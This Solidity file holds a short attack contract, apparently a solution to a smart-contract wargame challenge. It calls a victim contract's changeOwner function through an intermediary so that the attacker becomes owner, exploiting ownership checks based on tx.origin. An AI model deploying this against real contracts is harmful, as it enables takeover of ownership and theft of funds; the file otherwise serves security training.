// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/access/Ownable.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack is Ownable {
    address victimContract;

    constructor(address addr) {
        victimContract = addr;
    }

    function attack() external onlyOwner {
        ITelephone(victimContract).changeOwner(owner());
    }
}
